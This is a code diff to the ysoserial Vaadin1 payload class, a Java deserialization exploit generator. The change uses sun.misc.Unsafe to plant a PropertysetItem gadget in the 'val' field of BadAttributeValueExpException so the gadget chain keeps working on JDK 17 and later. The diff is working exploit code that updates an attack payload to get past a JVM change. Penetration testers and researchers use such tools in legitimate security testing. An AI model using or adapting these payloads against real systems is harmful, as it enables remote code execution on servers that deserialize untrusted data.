@@ -1,9 +1,11 @@
 package ysoserial.payloads;
 
+import java.lang.reflect.Field;
 import javax.management.BadAttributeValueExpException;
 
 import com.vaadin.data.util.NestedMethodProperty;
 import com.vaadin.data.util.PropertysetItem;
+import sun.misc.Unsafe;
 
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
@@ -66,7 +68,12 @@ public class Vaadin1 implements ObjectPayload<Object>
         pItem.addItemProperty ("outputProperties", nmprop);
         
         BadAttributeValueExpException b = new BadAttributeValueExpException ("");
-        Reflections.setFieldValue (b, "val", pItem);
+        // JDK 17+ changed val field type from Object to String — use Unsafe to bypass
+        final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
+        unsafeField.setAccessible(true);
+        final Unsafe unsafe = (Unsafe) unsafeField.get(null);
+        final Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
+        unsafe.putObject(b, unsafe.objectFieldOffset(valField), pItem);
         
         return b;
     }
